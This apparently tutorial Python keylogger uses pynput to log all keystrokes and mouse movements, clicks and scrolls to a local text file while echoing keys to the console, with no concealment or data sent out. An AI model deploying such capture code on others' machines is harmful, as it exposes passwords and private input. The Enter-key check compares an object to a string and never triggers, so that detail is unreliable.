'''
Hi this is a tutorial for understanding and development of keylogger in python.
This is a very simple keylogger but we will try to improve it with time.
'''

from pynput.keyboard import Listener as keyboard_listener
from pynput.mouse import Listener as mouse_listener
from datetime import datetime

logfile =  open('keylogger.txt','a')

def init_logfile():
    start_time = str(datetime.now())
    logfile.write('#'*10 + start_time + '\n')
    logfile.write("Starting Keylogger\n")


def write(key):
    logfile.write(str(key))




def on_press(key):
    if key=='Key.enter':
        key='\n'
    write(key)
    print('key %s is typed' %(key))


def on_release(key):
    print('key %s is released' %(key))


def on_move(x, y):
    logfile.write("Mouse moved to ({0}, {1})\n".format(x, y))

def on_click(x, y, button, pressed):
    if pressed:
        logfile.write('Mouse clicked at ({0}, {1}) with {2}\n'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logfile.write('Mouse scrolled at ({0}, {1})({2}, {3})\n'.format(x, y, dx, dy))


def start_listener():
    with keyboard_listener(on_press,on_release) as k_listener :
        with mouse_listener(on_scroll=on_scroll, on_move=on_move, on_click=on_click) as m_listener :
            k_listener.join()
            m_listener.join()


def main():
    init_logfile()
    start_listener()


if __name__ == '__main__':
    main()